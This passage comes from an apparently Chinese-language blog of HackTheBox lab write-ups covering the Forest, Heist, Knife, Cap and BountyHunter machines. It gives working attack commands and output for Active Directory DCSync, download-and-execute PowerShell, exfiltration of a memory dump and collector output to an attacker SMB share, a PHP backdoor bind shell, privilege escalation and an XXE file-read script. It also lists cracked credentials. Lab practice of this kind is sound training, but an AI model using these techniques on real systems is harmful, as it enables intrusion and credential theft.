<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">s3rvice          ($krb5asrep$23<span class="variable">$svc</span>-alfresco@HTB)</span><br></pre></td></tr></table></figure>
<p>evil-winrm登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</span><br><span class="line"><span class="built_in">type</span> C:\users\svc-alfresco\desktop\user.txt</span><br><span class="line"></span><br><span class="line">e5e4e47ae7022664cda6eb013fb0d9ed</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-9"><a class="markdownIt-Anchor" href="#权限提升-9"></a> 权限提升</h2>
<p>下载bloodhound的powershell版本的collector，开启HTTP服务和SMB服务(impacket)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1</span><br><span class="line">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</span><br><span class="line">python -m http.server 9998&amp;</span><br><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp;</span><br></pre></td></tr></table></figure>
<p>靶机上下载bloodhound collector并回传输出文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&quot;http://10.10.16.11:9998/PowerView.ps1&quot;</span>)</span><br><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&quot;http://10.10.16.11:9998/SharpHound.ps1&quot;</span>)</span><br><span class="line">powershell -<span class="built_in">exec</span> bypass</span><br><span class="line">invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</span><br><span class="line">net use \\10.10.16.11\Bufferfly /u:Buffer fly</span><br><span class="line">copy 20210705223815_BloodHound.zip \\10.10.16.11\Bufferfly\</span><br><span class="line">net use /d \\10.10.16.11\Bufferfly</span><br></pre></td></tr></table></figure>
<p>bloodhound的内容实在是看不懂，看了WP<br />
大概思路是</p>
<ol>
<li>用户&quot;svc-alfresco&quot;拥有账户操作权限，可以创建域账户</li>
<li>用户&quot;svc-alfresco&quot;完全控制&quot;Exchange Windows Permissions&quot;组(GenericAll)，可以将&quot;svc-alfresco&quot;加入&quot;Exchange Windows Permissions&quot;组</li>
<li>&quot;Exchange Windows Permissions&quot;组可以修改域用户的ACL(WriteDacl)</li>
<li>用户&quot;svc-alfresco&quot;利用&quot;Exchange Windows Permissions&quot;组的权限赋予&quot;DCSync&quot;权限</li>
<li>利用这个域账户进行DCSync攻击</li>
</ol>
<p>添加域用户</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user bufferfly bufferfly /add /domain</span><br></pre></td></tr></table></figure>
<p>执行命令后重新Getshell</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ADGroupMember -Identity <span class="string">&quot;Exchange Windows Permissions&quot;</span> -Members svc-alfresco</span><br></pre></td></tr></table></figure>
<p>查看组</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br><span class="line"></span><br><span class="line">HTB\Exchange Windows Permissions           Group            S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">HTB\Exchange Trusted Subsystem             Group            S-1-5-21-3072663084-364016917-1341370565-1119 Mandatory group, Enabled by default, Enabled grou</span><br></pre></td></tr></table></figure>
<p>添加DCSync权限(PowerView.ps1)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity <span class="string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity bufferfly -Rights DCSync</span><br></pre></td></tr></table></figure>
<p>DCSync攻击</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -just-dc <span class="string">&quot;htb/bufferfly:bufferfly@10.10.10.161&quot;</span></span><br><span class="line"></span><br><span class="line">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span><br></pre></td></tr></table></figure>
<p>Hash登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">f048153f202bbb2f82622b04d79129cc</span><br></pre></td></tr></table></figure>
<p>貌似svc-alfresco不是域用户，而DCSync的操作需要一个域用户的凭证</p>
<p>Powershell在运行命令时貌似会自动地从ps1文件载入函数，很方便</p>
<hr />
<h1 id="hackthebox_heist"><a class="markdownIt-Anchor" href="#hackthebox_heist"></a> HackTheBox_Heist</h1>
<h2 id="端口扫描-10"><a class="markdownIt-Anchor" href="#端口扫描-10"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.149</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.149</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-9"><a class="markdownIt-Anchor" href="#漏洞利用-9"></a> 漏洞利用</h2>
<p>访问<code>http://10.10.10.149/attachments/config.txt</code></p>
<ul>
<li>cisco的密码可以在线破解(<a target="_blank" rel="noopener" href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">https://www.ifm.net.nz/cookbooks/passwordcracker.html</a>)</li>
<li>md5直接john爆破</li>
</ul>
<p>得到一些账户</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rout3r:<span class="variable">$uperP</span>@ssword</span><br><span class="line">admin:Q4)sJu\Y8qz*A3?d</span><br><span class="line">secret:stealth1agent</span><br></pre></td></tr></table></figure>
<p>测试hazard的密码(由于未知原因，hydra不能爆破SMB)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span><br><span class="line">        </span><br><span class="line">  Disk                                                    Permissions Comment</span><br><span class="line">  ----                                                    ----------- -------</span><br><span class="line">  ADMIN$                                              NO ACCESS Remote Admin</span><br><span class="line">  C$                                                  NO ACCESS Default share</span><br><span class="line">  IPC$                                                READ ONLY Remote IPC</span><br></pre></td></tr></table></figure>
<p>枚举域账户信息</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py hazard:stealth1agent@heist</span><br><span class="line"></span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br></pre></td></tr></table></figure>
<p>字典</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line"></span><br><span class="line">hazard</span><br><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">rout3r</span><br><span class="line">admin</span><br><span class="line">secret</span><br><span class="line">support</span><br><span class="line">Chase</span><br><span class="line">------</span><br><span class="line">cat pass</span><br><span class="line"></span><br><span class="line"><span class="variable">$uperP</span>@ssword</span><br><span class="line">Q4)sJu\Y8qz*A3?d</span><br><span class="line">stealth1agent</span><br></pre></td></tr></table></figure>
<p>爆破winrm服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm 10.10.10.149 -d heist -u user -p pass</span><br><span class="line"></span><br><span class="line">WINRM       10.10.10.149    5985   10.10.10.149     [+] heist\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)</span><br></pre></td></tr></table></figure>
<p>winrm登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.149 -u chase -p <span class="string">&quot;Q4)sJu\Y8qz*A3?d&quot;</span></span><br><span class="line"><span class="built_in">type</span> c:\users\chase\desktop\user.txt</span><br><span class="line"></span><br><span class="line">a127daef77ab6d9d92008653295f59c4</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-10"><a class="markdownIt-Anchor" href="#权限提升-10"></a> 权限提升</h2>
<p>查看进程</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line"></span><br><span class="line">    378      28    25008      62440       1.16   6216   1 firefox</span><br><span class="line">    355      25    16444      38908       0.27   6564   1 firefox</span><br><span class="line">   1050      73   172600     248916      13.88   6732   1 firefox</span><br><span class="line">    347      19     9972      34476       0.23   6844   1 firefox</span><br><span class="line">    401      34    40728     101244       3.31   6956   1 firefox</span><br></pre></td></tr></table></figure>
<p>可以看看firefox进程内存</p>
<p>开启HTTP服务与SMB服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9998&amp;</span><br><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp;</span><br></pre></td></tr></table></figure>
<p>上传procdump并回传firefox进程内存</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -uri http://10.10.16.14:9998/procdump64.exe -outfile procdump64.exe</span><br><span class="line">./procdump64.exe -accepteula -ma 6216</span><br><span class="line">net use \\10.10.16.14\Bufferfly /u:Buffer fly</span><br><span class="line">copy firefox.exe_210706_221007.dmp \\10.10.16.14\Bufferfly\</span><br><span class="line">net use /d \\10.10.16.14\Bufferfly</span><br></pre></td></tr></table></figure>
<p>查找admin相关信息</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -a admin firefox.exe_210706_221007.dmp</span><br><span class="line"></span><br><span class="line">localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ</span><br></pre></td></tr></table></figure>
<p>wimrm登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.149 -u administrator -p <span class="string">&#x27;4dD!5&#125;x/re8]FBuZ&#x27;</span></span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">50dfa3c6bfd20e2e0d071b073d766897</span><br></pre></td></tr></table></figure>
<p>还是没想通为啥hydra爆不了smb，以后有机会再试试</p>
<hr />
<h1 id="hachthebox_knife"><a class="markdownIt-Anchor" href="#hachthebox_knife"></a> HachTheBox_Knife</h1>
<h2 id="端口扫描-11"><a class="markdownIt-Anchor" href="#端口扫描-11"></a> 端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5 10.10.10.242</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.242</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-10"><a class="markdownIt-Anchor" href="#漏洞利用-10"></a> 漏洞利用</h2>
<p>得到PHP版本信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.10.242/</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 05 Aug 2021 05:54:34 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/8.1.0-dev</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
<p>查询得到相关漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">searchsploit php 8.1 dev</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                             |  Path</span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line">PHP 8.1.0-dev - &#39;User-Agentt&#39; Remote Code Execution        | php&#x2F;webapps&#x2F;49933.py</span><br><span class="line">----------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br></pre></td></tr></table></figure>
<p>将Bash开放到目标服务器9876端口，并用nc连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;User-Agentt: zerodiumsystem(&#x27;mkfifo /tmp/bufferfly; cat /tmp/bufferfly | /bin/bash -i 2&gt;&amp;1 | nc -l 9876 &gt; /tmp/bufferfly&#x27;);&quot;</span> http://10.10.10.242/</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.10.242 9876</span><br><span class="line">cat /home/james/user.txt</span><br><span class="line"></span><br><span class="line">71a8b414816d223319c095a64edbae6c</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-11"><a class="markdownIt-Anchor" href="#权限提升-11"></a> 权限提升</h2>
<p>查看sudo权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> james on knife:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/knife</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root knife <span class="built_in">exec</span> --<span class="built_in">exec</span> <span class="string">&quot;exec &#x27;/bin/bash -i&#x27;&quot;</span></span><br><span class="line">cat /root/root.txt</span><br><span class="line"></span><br><span class="line">6fa9527622b5b0396511a575bd529b42</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hachthebox_cap"><a class="markdownIt-Anchor" href="#hachthebox_cap"></a> HachTheBox_Cap</h1>
<h2 id="端口扫描-12"><a class="markdownIt-Anchor" href="#端口扫描-12"></a> 端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5 10.10.10.245</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.245</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    gunicorn</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-11"><a class="markdownIt-Anchor" href="#漏洞利用-11"></a> 漏洞利用</h2>
<p>下载流量包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://10.10.10.245/download/0</span><br><span class="line">wireshark 0</span><br></pre></td></tr></table></figure>
<p>得到FTP登入凭证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nathan:Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh nathan@10.10.10.245</span><br><span class="line">Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /home/nathan/user.txt</span><br><span class="line"></span><br><span class="line">f514ef062a27e672c5e88001061d8c5a</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-12"><a class="markdownIt-Anchor" href="#权限提升-12"></a> 权限提升</h2>
<p>查看capability</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> /* -r 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br></pre></td></tr></table></figure>
<p>使用python进行提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3.8 -c <span class="string">&#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">cat /root/root.txt</span><br><span class="line"></span><br><span class="line">64941cc0edb38d723f72d34453780c90</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hachthebox_bountyhunter"><a class="markdownIt-Anchor" href="#hachthebox_bountyhunter"></a> HachTheBox_BountyHunter</h1>
<h2 id="端口扫描-13"><a class="markdownIt-Anchor" href="#端口扫描-13"></a> 端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn -T5  10.10.11.100</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.100</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="路径扫描-3"><a class="markdownIt-Anchor" href="#路径扫描-3"></a> 路径扫描</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.11.100/ -X .php</span><br><span class="line"></span><br><span class="line">+ http://10.10.11.100/db.php (CODE:200|SIZE:0) </span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-12"><a class="markdownIt-Anchor" href="#漏洞利用-12"></a> 漏洞利用</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">file = <span class="built_in">input</span>()</span><br><span class="line">payload = &#123;<span class="string">&quot;data&quot;</span>:base64.b64encode((<span class="string">&quot;&quot;&quot;&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=&quot;&quot;&quot;</span> + file + <span class="string">&quot;&quot;&quot;\&quot;&gt;]&gt;</span></span><br><span class="line"><span class="string">        &lt;bugreport&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;cwe&gt;2&lt;/cwe&gt;</span></span><br><span class="line"><span class="string">        &lt;cvss&gt;3&lt;/cvss&gt;</span></span><br><span class="line"><span class="string">        &lt;reward&gt;4&lt;/reward&gt;</span></span><br><span class="line"><span class="string">        &lt;/bugreport&gt;&quot;&quot;&quot;</span>).encode()).decode()&#125;</span><br><span class="line">url = <span class="string">&quot;http://10.10.11.100/tracker_diRbPr00f314.php&quot;</span></span><br><span class="line">res=req.post(url=url, data=payload)</span><br><span class="line">data = res.text</span><br><span class="line">data = data.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">result = base64.b64decode(re.findall(<span class="string">&quot;&lt;td&gt;Title:&lt;/td&gt;    &lt;td&gt;(.*?)&lt;/td&gt;&quot;</span>, data)[<span class="number">0</span>].encode()).decode()</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>读取/etc/passwd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">development:x:1000:1000:Development:&#x2F;home&#x2F;development:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>读取db.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TODO -&gt; Implement login system with the database.</span></span><br><span class="line"><span class="variable">$dbserver</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;bounty&quot;</span>;</span><br><span class="line"><span class="variable">$dbusername</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$dbpassword</span> = <span class="string">&quot;m19RoAU0hP41A1sTsq6K&quot;</span>;</span><br><span class="line"><span class="variable">$testuser</span> = <span class="string">&quot;test&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>登入SSH服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh development@10.10.11.100</span><br><span class="line">m19RoAU0hP41A1sTsq6K</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /home/development/user.txt</span><br><span class="line"></span><br><span class="line">96248cc10e05f03e3b63eb59adfd9d4c</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-13"><a class="markdownIt-Anchor" href="#权限提升-13"></a> 权限提升</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;development&#x2F;contract.txt</span><br><span class="line"></span><br><span class="line">Hey team,</span><br><span class="line"></span><br><span class="line">I&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.</span><br><span class="line"></span><br><span class="line">This has been our first job since the &quot;rm -rf&quot; incident and we can&#39;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.</span><br><span class="line"></span><br><span class="line">I set up the permissions for you to test this. Good luck.</span><br><span class="line"></span><br><span class="line">-- John</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
